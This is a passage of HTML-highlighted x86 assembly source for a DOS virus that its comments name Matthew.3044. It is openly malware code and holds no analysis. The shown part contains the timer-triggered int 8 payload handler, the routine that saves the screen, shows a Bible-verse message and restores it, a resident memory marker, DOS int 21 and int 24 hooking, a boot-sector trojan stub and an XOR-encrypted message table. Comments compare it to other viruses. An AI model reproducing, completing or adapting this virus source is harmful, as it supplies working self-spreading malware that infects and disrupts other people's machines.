       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteScreen</span><span class="sc0">                   </span><span class="sc1">; and display</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">MaxColumn</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">WriteNextChar</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc5">MaxRow</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">WriteNextChar</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- main payload routine</span><span class="sc0">
 
 </span><span class="sc5">ShowTime</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc0">   </span><span class="sc1">; set save screen buffer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadCursorPosition</span><span class="sc0">       </span><span class="sc1">; save current cursor location</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; start at row 0 column 1</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- save current screen content</span><span class="sc0">
 
 </span><span class="sc5">SaveNextChar</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetCursorPosition</span><span class="sc0">        </span><span class="sc1">; move cursor</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadScreen</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">MaxColumn</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">SaveNextChar</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc5">MaxRow</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">SaveNextChar</span><span class="sc0">
 
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetCursorPosition</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- show Matthew 6:26 </span><span class="sc0">
 
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowPayload</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">16h</span><span class="sc0">                 </span><span class="sc1">; pause</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- restore original screen content</span><span class="sc0">
 
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc0">        </span><span class="sc1">; set pointer to screen save</span><span class="sc0">
 </span><span class="sc5">RestoreNextChar</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; buffer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetCursorPosition</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteScreen</span><span class="sc0">                   </span><span class="sc1">; and restore</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">MaxColumn</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">RestoreNextChar</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc5">MaxRow</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">RestoreNextChar</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">CursorPosition</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetCursorPosition</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- marks memory SelfRec</span><span class="sc0">
 
 </span><span class="sc5">SetMemoryMark</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">MemoryMarkerLoc</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- initialize data</span><span class="sc0">
 
 </span><span class="sc5">InitializeClockCounter</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Timer</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">ClearPayloadFlag</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ShowPayloadFlag</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">Trigger</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">16</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- int 8 handler</span><span class="sc0">
 
 </span><span class="sc5">isClock</span><span class="sc4">:</span><span class="sc0">      
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ClockInterrupt</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">ShowPayloadFlag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; am i activating?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PassToClock</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">DropTrojanFlag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; am i dropping trojan?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PassToClock</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Trigger</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">Timer</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; is it show time?</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">DoNotShowPayload</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">                  </span><span class="sc1">; is trigger at lowest limit?</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">GotLowerLimit</span><span class="sc0">             </span><span class="sc1">; if yes, no reset.</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">Trigger</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">             </span><span class="sc1">; lessen next trigger time?</span><span class="sc0">
 </span><span class="sc5">GotLowerLimit</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InitializeClockCounter</span><span class="sc0">    </span><span class="sc1">; reset timer</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ShowPayloadFlag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; set showtime flag</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetVideoMode</span><span class="sc0">              </span><span class="sc1">; get video mode and screen page</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">; are we on 80x25 text mode?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">DoNotShowPayload</span><span class="sc0">          </span><span class="sc1">; if no, no show</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowTime</span><span class="sc0">                  </span><span class="sc1">; payload time</span><span class="sc0">
 </span><span class="sc5">DoNotShowPayload</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">Timer</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; increment timer</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ShowPayloadFlag</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; clear payload flag</span><span class="sc0">
 </span><span class="sc5">PassToClock</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">iret</span><span class="sc0">
 
 </span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; You can compare the int 24 handler and the call to the original</span><span class="sc0">
 </span><span class="sc1">; int 21 handler to that Possessed and Oggo. Isn't it the same </span><span class="sc0">
 </span><span class="sc1">; except for minor alterations.</span><span class="sc0">
 </span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- int 24 handler</span><span class="sc0">
 </span><span class="sc5">isError</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SaveSsOnInt21</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SaveSpOnInt21</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- call to old dos handler</span><span class="sc0">
 </span><span class="sc5">UseDos</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SaveSsOnInt21</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SaveSpOnInt21</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosInterrupt</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- Matthew boot sector trojan</span><span class="sc0">
 </span><span class="sc5">isTrojan</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TrojanStart</span><span class="sc0">
 
 </span><span class="sc5">DisketteBpb</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; diskette original bpb</span><span class="sc0">
 
 
 </span><span class="sc1">;---------------------------------------- This is decrypted on install</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------- to get a fresh copy of the  </span><span class="sc0">
 </span><span class="sc1">;---------------------------------------- text. Possessed like, isn't it?</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- encrypted text</span><span class="sc0">
 
 </span><span class="sc5">MatthewMessEncrypt</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
 </span><span class="sc1">;==========================================================================;</span><span class="sc0">
 </span><span class="sc1">; This is the original message of Matthew.3044                             ;</span><span class="sc0">
 </span><span class="sc1">;==========================================================================;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">94h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">9dh</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">9bh</span><span class="sc4">,</span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">0d3h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">9Ah</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">9Bh</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">8Ch</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc4">,</span><span class="sc2">9Ah</span><span class="sc4">,</span><span class="sc2">9Eh</span><span class="sc4">,</span><span class="sc2">8Fh</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">8Ch</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">9dh</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">0d3h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">8ah</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0b7h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">9bh</span><span class="sc4">,</span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">8ah</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
